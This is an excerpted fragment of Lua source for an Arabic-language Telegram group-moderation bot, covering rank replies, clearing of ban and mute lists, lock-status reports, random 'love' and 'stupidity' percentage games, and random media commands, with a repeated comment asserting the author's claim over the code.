end
if text and text:match("^تغير رد المنشئ (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المنشئ (.*)$") 
AliNight:set(Night.."Abs:Constructor:Rd"..msg.chat_id_,Text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المدير (.*)$") 
AliNight:set(Night.."Abs:Managers:Rd"..msg.chat_id_,Text) 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد الادمن (.*)$") 
AliNight:set(Night.."Abs:Admins:Rd"..msg.chat_id_,Text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المميز (.*)$") 
AliNight:set(Night.."Abs:VipMem:Rd"..msg.chat_id_,Text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المنظف (.*)$") 
AliNight:set(Night.."Abs:Cleaner:Rd"..msg.chat_id_,Text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد العضو (.*)$") 
AliNight:set(Night.."Abs:mem:Rd"..msg.chat_id_,Text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" and ChCheck(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حذف جميع ردود الرتب", 1, 'md')
AliNight:del(Night.."Abs:mem:Rd"..msg.chat_id_)
AliNight:del(Night.."Abs:Cleaner:Rd"..msg.chat_id_)
AliNight:del(Night.."Abs:VipMem:Rd"..msg.chat_id_)
AliNight:del(Night.."Abs:Admins:Rd"..msg.chat_id_)
AliNight:del(Night.."Abs:Managers:Rd"..msg.chat_id_)
AliNight:del(Night.."Abs:Constructor:Rd"..msg.chat_id_)
AliNight:del(Night.."Abs:BasicConstructor:Rd"..msg.chat_id_)
AliNight:del(Night.."Abs:SudoBot:Rd"..msg.chat_id_)
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if #admins == 0 then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✯︙*عدد البوتات هنا* ↫ '..n..'\n'
local f = '✯︙*عدد البوتات المرفوعه* ↫ '..t..'\n✯︙*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Ali_Night(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
...
if tonumber(admins[i].user_id_) ~= tonumber(Night) then
...
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*عدد البوتات هنا* ↫ "..c.."\n✯︙*عدد البوتات المرفوعه* ↫ "..x.."\n✯︙*تم طرد* ↫ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
AliNight:del(Night..'Abs:Owner:'..msg.chat_id_)
end
end
if Owner(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم حذف المنشئين الاساسيين")  
AliNight:del(Night..'Abs:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم حذف المنشئين")  
AliNight:del(Night..'Abs:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم حذف المدراء")  
AliNight:del(Night..'Abs:Managers:'..msg.chat_id_)
end 
...
AliNight:del(Night.."Abs:Groups:Links"..msg.chat_id_)
end
...
AliNight:del(Night..'Abs:Muted:'..msg.chat_id_)
...
AliNight:srem(Night..'Abs:Tkeed:'..msg.chat_id_, v)
end 
...
AliNight:del(Night..'Abs:Filters:'..msg.chat_id_)
AliNight:del(Night.."Abs:FilterAnimation"..msg.chat_id_)
AliNight:del(Night.."Abs:FilterPhoto"..msg.chat_id_)
AliNight:del(Night.."Abs:FilterSteckr"..msg.chat_id_)
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙للمنشئ الاساسي فقط', 1, 'md')
else
AliNight:del(Night..'Abs:Ban:'..msg.chat_id_) AliNight:del(Night..'Abs:Admins:'..msg.chat_id_) AliNight:del(Night..'User:Donky:'..msg.chat_id_) AliNight:del(Night..'Abs:VipMem:'..msg.chat_id_) AliNight:del(Night..'Abs:Filters:'..msg.chat_id_) AliNight:del(Night..'Abs:Muted:'..msg.chat_id_)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
local Managers = AliNight:smembers(Night..'Abs:Managers:'..msg.chat_id_)
local admins = AliNight:smembers(Night..'Abs:Admins:'..msg.chat_id_)
local vipmem = AliNight:smembers(Night..'Abs:VipMem:'..msg.chat_id_)
local donky = AliNight:smembers(Night..'User:Donky:'..msg.chat_id_)
...
spam_c = AliNight:get(Night..'Abs:Spam:Text'..msg.chat_id_)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if AliNight:get(Night.."Abs:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif AliNight:get(Night.."Abs:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif AliNight:get(Night.."Abs:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if AliNight:get(Night..'Abs:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if AliNight:get(Night..'Abs:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
...
if AliNight:get(Night..'Abs:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if AliNight:get(Night.."Abs:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if AliNight:get(Night..'Abs:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if AliNight:get(Night..'Abs:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if AliNight:get(Night..'Abs:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if AliNight:get(Night..'Abs:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = AliNight:hget(Night.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل كول'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Speak:after:me'..msg.chat_id_) 
end
if text == "تعطيل كول" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل كول'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Speak:after:me'..msg.chat_id_,true)  
end
if text and text:match("^كول (.*)$") and ChCheck(msg) and not AliNight:get(Night.."Speak:after:me"..msg.chat_id_) then
...
if text and text:match("^انطق (.*)$") and not AliNight:get(Night..'Abs:Antk:Abs'..msg.chat_id_) and ChCheck(msg) then
...
if text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
AliNight:del(Night..'Abs:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
AliNight:del(Night..'Abs:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
AliNight:set(Night..'Abs:rules'..msg.chat_id_,text)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙ارسل لي القوانين الان', 1, 'md')
AliNight:set(Night..'Abs:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = AliNight:get(Night..'Abs:rules'..msg.chat_id_)
...
AliNight:set(Night..'LoveNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and AliNight:get(Night..'LoveNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الحب ', 1, 'md')
AliNight:del(Night..'LoveNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙نسبة الحب بين '..text..' هي : '..Abs..'%', 1, 'md')
AliNight:del(Night..'LoveNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not AliNight:get(Night..'Abs:Nsba:Abs'..msg.chat_id_) then
if text == "نسبه الخيانه" and ChCheck(msg) or text == "نسبة الخيانه" and ChCheck(msg) or text == "↫ نسبه الخيانه ✯" and ChCheck(msg) then
AliNight:set(Night..'RyNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ✯" and AliNight:get(Night..'RyNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الخيانه ', 1, 'md')
AliNight:del(Night..'RyNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙نسبة الخيانه بين '..text..' هي : '..Abs..'%', 1, 'md')
AliNight:del(Night..'RyNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not AliNight:get(Night..'Abs:Nsba:Abs'..msg.chat_id_) then
if text and (text == "نسبه الجمال" or text == "نسبة الجمال" or text == "↫ نسبه الجمال ✯") and ChCheck(msg) then
AliNight:set(Night..'JNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ✯" and AliNight:get(Night..'JNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الجمال ', 1, 'md')
AliNight:del(Night..'JNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙نسبة جمال '..text..' هي : '..Abs..'%', 1, 'md')
AliNight:del(Night..'JNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not AliNight:get(Night..'Abs:Nsba:Abs'..msg.chat_id_) then
if text == "نسبه الكره" and ChCheck(msg) or text == "نسبة الكره" and ChCheck(msg) or text == "↫ نسبه الكره ✯" and ChCheck(msg) then
AliNight:set(Night..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ✯" and AliNight:get(Night..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الكره ', 1, 'md')
AliNight:del(Night..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙نسبة الكره بين '..text..' هي : '..Abs..'%', 1, 'md')
AliNight:del(Night..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not AliNight:get(Night..'Abs:Nsba:Abs'..msg.chat_id_) then
...
AliNight:set(Night..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ✯" and AliNight:get(Night..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الرجوله ', 1, 'md')
AliNight:del(Night..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙نسبة رجولة '..text..' هي : '..Abs..'%', 1, 'md')
AliNight:del(Night..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not AliNight:get(Night..'Abs:Nsba:Abs'..msg.chat_id_) then
...
AliNight:set(Night..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ✯" and AliNight:get(Night..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الانوثه ', 1, 'md')
AliNight:del(Night..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙نسبة انوثة '..text..' هي : '..Abs..'%', 1, 'md')
AliNight:del(Night..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not AliNight:get(Night..'Abs:Nsba:Abs'..msg.chat_id_) then
if text and (text == "نسبه الغباء" or text == "نسبة الغباء" or text == "↫ نسبه الغباء ✯") and ChCheck(msg) then
AliNight:set(Night..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ✯" and AliNight:get(Night..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الغباء ', 1, 'md')
AliNight:del(Night..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙نسبة غباء '..text..' هي : '..Abs..'%', 1, 'md')
AliNight:del(Night..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل المتحركه'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:gif:Abs'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل المتحركه'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:gif:Abs'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ✯") and not AliNight:get(Night..'Abs:gif:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(2,1075); 
local Text ='*✯︙تم اختيار المتحركه لك*'
keyboard = {}  
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الميمز'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:memz:Abs'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الميمز'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:memz:Abs'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ✯") and not AliNight:get(Night..'Abs:memz:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(2,1201); 
local Text ='*✯︙تم اختيار مقطع الميمز لك*'
keyboard = {}  
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل غنيلي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Audios:Abs'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل غنيلي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Audios:Abs'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ✯") and not AliNight:get(Night..'Abs:Audios:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(4,2824); 
local Text ='*✯︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الاغاني'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:mp3:Abs'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الاغاني'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:mp3:Abs'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ✯" or text == "اغاني") and not AliNight:get(Night..'Abs:mp3:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(2,1167); 
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الريمكس'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Remix:Abs'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الريمكس'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Remix:Abs'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ✯") and not AliNight:get(Night..'Abs:Remix:Abs'..msg.chat_id_) and ChCheck(msg) then
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الصوره'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Photo:Abs'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الصوره'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Photo:Abs'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ✯") and not AliNight:get(Night..'Abs:Photo:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(4,1171); 
local Text ='*✯︙تم اختيار الصوره لك*'
keyboard = {}  
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الانمي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Anime:Abs'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الانمي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Anime:Abs'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ✯") and not AliNight:get(Night..'Abs:Anime:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(3,1002); 
local Text ='*✯︙تم اختيار صورة الانمي لك*'
keyboard = {}  
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الافلام'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Movies:Abs'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الافلام'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Movies:Abs'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ✯") and not AliNight:get(Night..'Abs:Movies:Abs'..msg.chat_id_) and ChCheck(msg) then
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل المسلسلات'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Series:Abs'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل المسلسلات'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Series:Abs'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ✯") and not AliNight:get(Night..'Abs:Series:Abs'..msg.chat_id_) and ChCheck(msg) then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.photo_ then
if AliNight:get(Night..'Abs:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
Ali_Night(msg.chat_id_,msg.id_, 1, '✯︙ارسل صورة المجموعه الان', 1, 'md')
AliNight:set(Night..'Abs:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
